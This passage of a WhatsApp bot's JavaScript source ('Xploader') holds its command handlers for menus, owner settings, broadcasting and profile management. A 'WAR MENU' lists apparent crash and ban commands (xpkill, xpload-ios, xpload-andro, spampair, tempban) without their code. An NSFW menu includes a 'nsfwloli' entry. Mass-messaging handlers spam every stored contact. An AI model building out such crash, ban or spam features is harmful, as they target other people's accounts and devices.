                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
 //=================================================//
case "reactionmenu":
              let xmenu_rm = `
┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣ 
${readmore}
┏▣ ◊ 𝗥𝗘𝗔𝗧𝗜𝗢𝗡 𝗠𝗘𝗡𝗨 ◊
│□ cry
│□ kill
│□ hug
│□ pat
│□ lick
│□ kiss
│□ bite
│□ yeet
│□ bully 
│□ bonk
│□ wink
│□ poke
│□ nom
│□ slap
│□ smile
│□ wave
│□ awoo
│□ blush
│□ smug
│□ glomp 
│□ happy
│□ dance
│□ cringe
│□ cuddle
│□ highfive
│□ handhold
│□ shinobu
│□ woof
│□ 8ball
│□ goose 
│□ gecg
│□ feed
│□ avatar 
│□ foxgirl
│□ lizard
│□ spank
│□ meow
│□ tickle
┗▣ `;
if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: tylorkid5,
                        caption: xmenu_rm
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_rm,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
//=================================================//
case "nsfwmenu":
              let xmenu_nw = `
┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣
${readmore} 
┏▣ ◊ 𝗡𝗦𝗙𝗪 𝗠𝗘𝗡𝗨 ◊
│□ hentai
│□ trap
│□ neko
│□ waifu
│□ gasm
│□ milf
│□ animespank
│□ hentaivideo
│□ ahegao
│□ ass
│□ bdsm
│□ blowjob
│□ cuckold
│□ cum
│□ eba
│□ ero
│□ foot
│□ femdom
│□ glasses
│□ gangbang
│□ jahy
│□ manga
│□ masturbation
│□ neko-hentai
│□ neko-hentai2
│□ nsfwloli
│□ orgy
│□ panties
│□ pussy
│□ tentacles
│□ thighs
│□ yuri
│□ zettai
│□ gifblowjob
│□ gifhentai
┗▣ `;
 if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: tylorkid5,
                        caption: xmenu_nw
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_nw,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
 //=================================================//
 case "makermenu":
     let xmenu_ml = `
┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣
${readmore}
┏▣ ◊ 𝗠𝗔𝗞𝗘𝗥 𝗠𝗘𝗡𝗨 ◊
│□ ttp
│□ attp
┗▣ `;
if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: tylorkid5,
                        caption: xmenu_ml
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_ml,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
 //=================================================//
 case "warmenu":
 case "bugmenu":
 let xpbugs = `
┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣
${readmore}
┏▣ ◊ 𝗪𝗔𝗥 𝗠𝗘𝗡𝗨 ◊
│□ xpkill
│□ xpload-ios
│□ xpload-andro
│□ spampair
│□ tempban 
┗▣ `;
if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        video: tylorkid6,
                        caption: xpbugs
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xpbugs,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid2,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
 //=================================================//
case "menutype":
case "menuset":
        {
          if (!XpBotOwner) return reply(mess.owner);
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: `
         ❍「 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 」❍       
*_Choose your preferred menu type_*`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : tylorkid5}, { upload: Xploader.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"MENUTYPE 1","id":"${prefix}setmenu v1"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"MENUTYPE 2","id":"${prefix}setmenu v2"}`
              },
                                    ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '254796180105@s.whatsapp.net',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: fstatus })
      
      await Xploader.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
      if (text.startsWith("v")) {
            typemenu = text;
            reply(mess.done);
          }
        }
        break;
        case "setmenu":
        {
          if (!XpBotOwner) return reply(mess.owner)
          if (!text)
            return reply(
              `Please select either v1(Android & iOS) or v2(Android)\n Example: . setmenu v1`
            );;
          if (text.startsWith("v")) {
            typemenu = text;
            reply(mess.done);
          }
        }
        break;
//=================================================//
      case "mode":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 1)
          return reply(`*_Example ${prefix + command} public/private_*`);
        if (q == "public") {
          Xploader.public = true;
          reply(mess.done);
        } else if (q == "private") {
          Xploader.public = false;
          reply(mess.done);
        }
        break;
//=================================================//
case "autoread":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 1)
          return reply(`*_Example ${prefix + command} on/off_*`);
        if (q === "on") {
          db.data.settings[botNumber].autoread = true;
          reply(`*_Successfully changed autoread to ${q}_*`);
        } else if (q === "off") {
          db.data.settings[botNumber].autoread = false;
          reply(`*_Successfully changed autoread to ${q}_*`);
        }
        break;
//=================================================//
      case "offline":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 1)
          return reply(`*_Example ${prefix + command} on/off_*`);
        if (q === "on") {
          db.data.settings[botNumber].online = true;
          reply(`*Successfully changed unavailable to offline mode*`);
        } else if (q === "off") {
          db.data.settings[botNumber].online = false;
          reply(`*Successfully changed unavailable to online mode, please restart bot*`);
        }
        break;
//=================================================//
      case "autorecordtyping":
      case "autorecordtype":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 1)
          return reply(`*_Example ${prefix + command} on/off_*`);
        if (q === "on") {
          db.data.settings[botNumber].autorecordtype = true;
          reply(
            `*_Successfully changed Auto-RecordingTyping to ${q}_*`
          );
        } else if (q === "off") {
          db.data.settings[botNumber].autorecordtype = false;
          reply(
            `*_Successfully changed Auto-RecordingTyping to ${q}_*`
          );
        }
        break;
//=================================================//
      case "autorecord":
      case "autorecording":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 1)
          return reply(`*_Example ${prefix + command} on/off_*`);
        if (q === "on") {
          db.data.settings[botNumber].autorecord = true;
          reply(`*_Successfully changed Auto-Recording to ${q}_*`);
        } else if (q === "off") {
          db.data.settings[botNumber].autorecord = false;
          reply(`*_Successfully changed Auto-Recording to ${q}_*`);
        }
        break;
//=================================================//
      case "autotype":
      case "autotyping":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 1)
          return reply(`*_Example ${prefix + command} on/off_*`);
        if (q === "on") {
          db.data.settings[botNumber].autotype = true;
          reply(`*_Successfully changed Auto-Typing to ${q}_*`);
        } else if (q === "off") {
          db.data.settings[botNumber].autotype = false;
          reply(`*_Successfully changed Auto-Typing to ${q}_*`);
        }
        break;
//=================================================//
      case "autobio":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 1)
          return reply(`*_Example ${prefix + command} on/off_*`);
        if (q == "on") {
          db.data.settings[botNumber].autobio = true;
          reply(`*_Successfully Changed AutoBio To ${q}_*`);
        } else if (q == "off") {
          db.data.settings[botNumber].autobio = false;
          reply(`*_Successfully Changed AutoBio To ${q}_*`);
        }
        break;
//=================================================//
      case "take":
      case "steal":
      {
if (!args.join(" ")) return reply(`Where is the text?\nE.g Take Xploader|Bot`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
Xploader.downloadAndSaveMediaMessage(quoted, "gifee")
Xploader.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Xploader.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum length should be 10 Seconds!')
let media = await quoted.download()
let encmedia = await Xploader.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
reply(`Please reply to a sticker`)
}
}
break;
//=================================================//
      case "autostatusview":
      case "autosview":
      case "autoviewstatus":
      case "autoswview":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            antiswview = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            antiswview = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "setautoblock":
        if (!XpBotOwner) return reply(mess.owner);
        if (!text)
          return reply(
            `*_Example : ${prefix + command} 212_*`
          );
        global.autoblocknumber = text;
        reply(`*_Auto-Block number successfully changed to Country code ${text}_*`);
        break;
//=================================================//
      case "setantiforeign":
        if (!XpBotOwner) return reply(mess.owner);
        if (!text)
          return reply(
            `*_Example : ${prefix + command} 212_*`
          );
        global.antiforeignnumber = text;
        reply(`Anti-foreign number successfully changed to country code ${text}`);
        break;
//=================================================//
case "autoblock":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 1)
          return reply(`*_Example ${prefix + command} on/off_*`);
        if (q == "on") {
          db.data.settings[botNumber].autoblocknum = true;
          reply(`*_Successfully Changed Auto-Block To ${q}_*`);
        } else if (q == "off") {
          db.data.settings[botNumber].autoblocknum = false;
          reply(`*_Successfully Changed Auto-Block To ${q}_*`);
        }
        break;
//=================================================//
      case "onlygc":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 1)
          return reply(`*_Example ${prefix + command} on/off_*`);
        if (q == "on") {
          db.data.settings[botNumber].onlygroup = true;
          reply(`*Successful, now bot will only respond in groups*`);
        } else if (q == "off") {
          db.data.settings[botNumber].onlygroup = false;
          reply(`*Successful, now bot will respond anywhere.*`);
        }
        break;
 //=================================================//
      case "onlypc":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 1)
          return reply(`*_Example ${prefix + command} on/off_*`);
        if (q == "on") {
          db.data.settings[botNumber].onlypc = true;
          reply(`*_Successfully Changed Only-Pc To ${q}_*`);
        } else if (q == "off") {
          db.data.settings[botNumber].onlypc = false;
          reply(`*_Successfully Changed Only-Pc To ${q}_*`);
        }
        break;
//=================================================//
      case "private":
      case "self":
        {
          if (!XpBotOwner) return reply(mess.owner);
          Xploader.public = false;
          reply("*Successful in Changing To Private Usage*");
        }
        break;
//=================================================//
      case "public":
        {
          if (!XpBotOwner) return reply(mess.owner);
          Xploader.public = true;
          reply("*Successful in Changing To Public Usage*");
        }
        break;
//=================================================//
case "anticall":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            anticall = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            anticall = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
case "join":
        try {
          if (!XpBotOwner) return reply(mess.owner);
          if (!text) return reply("*_Enter Group Link!_*");
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply("*_Link Invalid!_*");
          let result = args[0].split("https://chat.whatsapp.com/")[1];
          Xploader.groupAcceptInvite(result);
          await reply(`*_Done_*`);
        } catch {
          reply("*Failed to join the Group*");
        }
        break;
//=================================================//
      case "getsession":
        if (!XpBotOwner) return reply(mess.owner);
        reply(
          "*Wait a moment, currently retrieving your session file*"
        );
        let sesi = fs.readFileSync("./session/creds.json");
        Xploader.sendMessage(
          m.chat,
          {
            document: sesi,
            mimetype: "application/json",
            fileName: "creds.json",
          },
          {
            quoted: m,
          }
        );
        break;
//=================================================//
      case "ipbot":
      case "serverip":
        if (!XpBotOwner) return reply(mess.owner);
        var http = require("http");
        http.get(
          {
            host: "api.ipify.org",
            port: 80,
            path: "/",
          },
          function (resp) {
            resp.on("data", function (ip) {
              reply("This bot's public IP address is: " + ip);
            });
          }
        );
        break;
//=================================================//
      case "request":
      case "reportbug":
        {
          if (!text)
            return reply(
              `Example : ${prefix + command} hi dev play command is not working`
            );
          textt = `*REQUEST/BUG*`;
          teks1 = `\n\n*User* : @${m.sender.split("@")[0]}\n*Request/Bug* : ${text}`;
          teks2 = `\n\n*Hi ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`;
          for (let i of owner) {
            Xploader.sendMessage("254754783972@s.whatsapp.net",
              {
                text: textt + teks1,
                mentions: [m.sender],
              },
              {
                quoted: m,
              }
            );
          }
          Xploader.sendMessage(
            m.chat,
            {
              text: textt + teks2 + teks1,
              mentions: [m.sender],
            },
            {
              quoted: m,
  });
        }
        break;
//=================================================//
      case "restart":
        if (!XpBotOwner) return reply(mess.owner);
        reply(`*_Restarting will be completed in seconds_*`);
        await sleep(3000);
        process.exit();
        break;
//=================================================//
   case "broadcast":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (!text) return reply("*Please insert a text*");
          let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`;
          for (let i of Object.keys(global.db.data.users)) {
            await sleep(1500);
            if (/image/.test(mime)) {
              var media = await quoted.download();
              await Xploader.sendMessage(i, {
                image: media,
                caption: teksnya,
              });
            } else if (/video/.test(mime)) {
              var media = await quoted.download();
              await Xploader.sendMessage(i, {
                video: media,
                caption: teksnya,
              });
            } else if (text) {
              await Xploader.sendMessage(i, {
                text: teksnya,
              });
            }
          }
          reply(
            `*_Success ${command} To ${
              Object.keys(global.db.data.users).length
            } Users_*`
          );
        }
        break;
//=================================================//
      case "pushcontact":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (!m.isGroup)
            return reply(`*_The feature works only in group_*`);
          if (!text) return reply(`*Please insert a text*`);
          let mem = await participants
            .filter((v) => v.id.endsWith(".net"))
            .map((v) => v.id);
          reply(`*_Success in pushing the message to contacts_*`);
          for (let pler of mem) {
            Xploader.sendMessage(pler, { text: q });
          }
          reply(`*_Done_*`);
        }
        break;
//=================================================//
      case "block":
        {
          if (!XpBotOwner) return reply(mess.owner);
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await Xploader.updateBlockStatus(users, "block");
          await reply(`*_Done_*`);
        }
        break;
//=================================================//
      case "unblock":
        {
          if (!XpBotOwner) return reply(mess.owner);
          let users = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await Xploader.updateBlockStatus(users, "unblock");
          await reply(`*_Done_*`);
        }
        break;
//=================================================//
      case "resethit":
        {
          if (!XpBotOwner) return reply(mess.owner);
          global.db.data.settings[botNumber].totalhit = 0;
          reply(mess.done);
        }
        break;
//=================================================//
      case "setreply":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (!text)
            return reply(
              `*_There are 3 reply(v1,v2,v3)_*\n*_Please select 1\nExample ${
                prefix + command
              } v1_*`
            );
          if (text.startsWith("v")) {
            typereply = text;
            reply(mess.done);
          } else {
            reply(
              `*_There are 3 reply(v1,v2,v3)_*\n*_Please select 1\nExample ${
                prefix + command
              } v1_*`
            );
          }
        }
        break;
//=================================================//
      case "posttextstatus":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (!q) return reply("*Please insert a text*");
          await Xploader.sendMessage(
            "status@broadcast",
            { text: q },
            {
              backgroundColor: "#FF000000",
              font: 3,
              statusJidList: Object.keys(global.db.data.users),
            }
          );
          reply(mess.done);
        }
        break;
//=================================================//
      case "postvideostatus":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (/video/.test(mime)) {
            var videosw = await Xploader.downloadAndSaveMediaMessage(
              quoted
            );
            await Xploader.sendMessage(
              "status@broadcast",
              {
                video: {
                  url: videosw,
                },
                caption: q ? q : "",
              },
              { statusJidList: Object.keys(global.db.data.users) }
            );
            await reply(mess.done);
          } else {
            reply("*_Reply to a video_*");
          }
        }
        break;
//=================================================//
      case "postimagestatus":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (/image/.test(mime)) {
            var imagesw = await Xploader.downloadAndSaveMediaMessage(
              quoted
            );
            await Xploader.sendMessage(
              "status@broadcast",
              {
                image: {
                  url: imagesw,
                },
                caption: q ? q : "",
              },
              { statusJidList: Object.keys(global.db.data.users) }
            );
            await reply(mess.done);
          } else {
            reply("*_Reply to an image_*");
          }
        }
        break;
//=================================================//
      case "postaudiostatus":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (/audio/.test(mime)) {
            var audiosw = await Xploader.downloadAndSaveMediaMessage(
              quoted
            );
            await Xploader.sendMessage(
              "status@broadcast",
              {
                audio: {
                  url: audiosw,
                },
                mimetype: "audio/mp4",
                ptt: true,
              },
              {
                backgroundColor: "#FF000000",
                statusJidList: Object.keys(global.db.data.users),
              }
            );
            await reply(mess.done);
          } else {
            reply("*_Reply to audio_*");
          }
        }
        break;
//=================================================//
      case "addpremium":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 2)
          return reply(
            `*_Use ${prefix + command} @tag time\n${
              prefix + command
            } number time\n\nExample : ${prefix + command} @tag 30d_*`
          );
        if (m.mentionedJid.length !== 0) {
          for (let i = 0; i < m.mentionedJid.length; i++) {
            addPremiumUser(m.mentionedJid[0], args[1], premium);
          }
          reply("*_Premium Success_*");
        } else {
          addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
          reply("*_Premium Success_*");
        }
        break;
//=================================================//
      case "delpremium":
        if (!XpBotOwner) return reply(mess.owner);
        if (args.length < 1)
          return reply(
            `*_Use ${prefix + command} @tag\n${
              prefix + command
            } number\n\nExample : ${prefix + command} 916909137213_*`
          );
        if (m.mentionedJid.length !== 0) {
          for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync(
              "./src/data/role/premium.json",
              JSON.stringify(premium)
            );
          }
          reply("*_Delete Success_*");
        } else {
          premium.splice(
            getPremiumPosition(args[0] + "@s.whatsapp.net", premium),
            1
          );
          fs.writeFileSync(
            "./src/data/role/premium.json",
            JSON.stringify(premium)
          );
          reply("*_Delete Success_*");
        }
        break;
//=================================================//
      case "listpremium":
        {
          if (!XpBotOwner) return reply(mess.owner);
          let data = require("./src/data/role/premium.json");
          let txt = `*------「 LIST PREMIUM 」------*\n\n`;
          for (let x of data) {
            txt += `Number : ${x.id}\n`;
            txt += `Expires In: ${x.expired} ms\n`;
            Xploader.sendMessage(
              m.chat,
              {
                text: txt,
                mentions: x,
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
//=================================================//
      case "addowner":
        if (!XpBotOwner) return reply(mess.owner);
        if (!args[0])
          return reply(
            `*_Use ${prefix + command} number\nExample ${
              prefix + command
            } ${ownernumber}_*`
          );
        bnnd = q.split("|")[0].replace(/[^0-9]/g, "");
        let ceknye = await Xploader.onWhatsApp(bnnd);
        if (ceknye.length == 0)
          return reply(
            `*_Enter A Valid And Registered Number On WhatsApp!!!_*`
          );
        owner.push(bnnd);
        fs.writeFileSync("./src/data/role/owner.json", JSON.stringify(owner));
        reply(`*_Number ${bnnd} Has Become An Owner!!!_*`);
        break;
//=================================================//
      case "delowner":
        if (!XpBotOwner) return reply(mess.owner);
        if (!args[0])
          return reply(
            `*_Use ${prefix + command} number\nExample ${
              prefix + command
            } 254796180105_*`
          );
        ya = q.split("|")[0].replace(/[^0-9]/g, "");
        unp = owner.indexOf(ya);
        owner.splice(unp, 1);
        fs.writeFileSync("./src/data/role/owner.json", JSON.stringify(owner));
        reply(
          `*_The Number ${ya} Has been deleted from owner list by the owner!!!_*`
        );
        break;
//=================================================//
      case "listowner":
        {
          let teks = "┌──⭓「 *List Owner* 」\n│\n";
          for (let x of owner) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`;
          reply(teks);
        }
        break;
//=================================================//
      case "delsession":
        {
          if (!XpBotOwner) return reply(mess.owner);
          fs.readdir("./session", async function (err, files) {
            if (err) {
              console.log("Unable to scan directory: " + err);
              return reply("Unable to scan directory: " + err);
            }
            let filteredArray = await files.filter(
              (item) =>
                item.startsWith("pre-key") ||
                item.startsWith("sender-key") ||
                item.startsWith("session-") ||
                item.startsWith("app-state")
            );
            console.log(filteredArray.length);
            let teks = `Detected ${filteredArray.length} junk files\n\n`;
            if (filteredArray.length == 0) return reply(teks);
            filteredArray.map(function (e, i) {
              teks += i + 1 + `. ${e}\n`;
            });
            reply(teks);
            await sleep(2000);
            reply("*_Deleting junk files..._*");
            await filteredArray.forEach(function (file) {
              fs.unlinkSync(`./session/${file}`);
            });
            await sleep(2000);
            reply(
              "*_Successfully deleted all the junk files in the session's folder_*"
            );
          });
        }
        break;
//=================================================//
      case "setprefix":
        if (!XpBotOwner) return reply(mess.owner);
        if (!text)
          return reply(
            `*_Example : ${prefix + command} ._*`
          );
        global.xprefix = text;
        reply(`*_Prefix successfully changed to ${text}_*`);
        break;
//=================================================//
      case "setprofilepic":
        if (!XpBotOwner) return reply(mess.owner);
        if (!quoted)
          return reply(
            `*_Send/Reply Image With Caption ${prefix + command}_*`
          );
        if (!/image/.test(mime))
          return reply(
            `*_Send/Reply Image With Caption ${prefix + command}_*`
          );
        if (/webp/.test(mime))
          return reply(
            `*_Send/Reply Image With Caption ${prefix + command}_*`
          );
        var medis = await Xploader.downloadAndSaveMediaMessage(
          quoted,
          "ppbot.jpeg"
        );
        if (args[0] == "full") {
          var { img } = await generateProfilePicture(medis);
          await Xploader.query({
            tag: "iq",
            attrs: {
              to: botNumber,
              type: "set",
              xmlns: "w:profile:picture",
            },
            content: [
              {
                tag: "picture",
                attrs: {
                  type: "image",
                },
                content: img,
              },
            ],
          });
          fs.unlinkSync(medis);
          reply(mess.done);
        } else {
          var memeg = await Xploader.updateProfilePicture(botNumber, {
            url: medis,
          });
          fs.unlinkSync(medis);
          reply(mess.done);
        }
        break;
//=================================================//
      case "leave":
      case "leavegc":
        if (!XpBotOwner) return reply(mess.owner);
        if (!m.isGroup) return reply(mess.group);
        reply("*_Bye Everyone 🥺_*");
        await Xploader.groupLeave(m.chat);
        break;
//=================================================//
  case "resetuser":
        {
          if (!XpBotOwner) return reply(mess.owner);
          let totalusernya = db.data.users[0];
          reply(
            `*_Succesfully Deleted ${totalusernya} Users in Database_*`
          );
          db.data.users = [];
        }
        break;
//=================================================//
      case "creategroup":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (!args.join(" "))
            return reply(`Use ${prefix + command} groupname`);
          try {
            let cret = await Xploader.groupCreate(args.join(" "), []);
            let response = await Xploader.groupInviteCode(cret.id);
            const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000)
              .tz("Africa/Nairobi")
              .format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`;
            Xploader.sendMessage(
              m.chat,
              {
                text: teksop,
                mentions: await Xploader.parseMention(teksop),
              },
              { quoted: m }
            );
          } catch {
            reply(`*_Error_*`);
          }
        }
        break;
//=================================================//
      case "setbio":
        {
          if (!XpBotOwner) return reply(mess.owner);
          if (!text)
            return reply(
              `Where is the text?\nExample: ${prefix + command} 𝐗𝐏𝐋𝐎𝐀𝐃𝐄𝐑 ᵇʸ Tყʅσɾ`
            );
          await Xploader.updateProfileStatus(text);
          reply(`*_Success in changing the bio of bot's number_*`);
        }
        break;
//=================================================//
  case "delprofilepic":
        {
          if (!XpBotOwner) return reply(mess.owner);
          await Xploader.removeProfilePicture(Xploader.user.id);
          reply(`*_Success in deleting bot's profile picture_*`);
        }
        break;
//=================================================//
case "setfullpp":
case "setfullppbot":
{
if (!XpBotOwner) return reply(mess.owner);
if(m.quoted){
const media = await Xploader.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await Xploader.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await reply("Successful")
} else reply("*Reply to an image*")
}
break;
//=================================================//
case "getcase":
        if (!XpBotOwner) return reply(mess.owner);
        try {
          const getCase = (cases) => {
            return (
              "case" +
              `"${cases}"` +
              fs
                .readFileSync("Xploader.js")
                .toString()
                .split("case '" + cases + "'")[1]
                .split("break")[0] +
              "break"
            );
          };
          reply(`${getCase(q)}`);
        } catch {
          reply(`case ${q} not found!`);
        }
        break;
//=================================================//
      case "delete":
      case "del":
        {
          let key = {};
          try {
            key.remoteJid = m.quoted
              ? m.quoted.fakeObj.key.remoteJid
              : m.key.remoteJid;
            key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe;
            key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id;
            key.participant = m.quoted
              ? m.quoted.fakeObj.participant
              : m.key.participant;
          } catch (e) {
            console.error(e);
          }
          Xploader.sendMessage(m.chat, { delete: key });
        }
        break;
//=====GROUP MENU CMDS===========================//
case "antibot":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
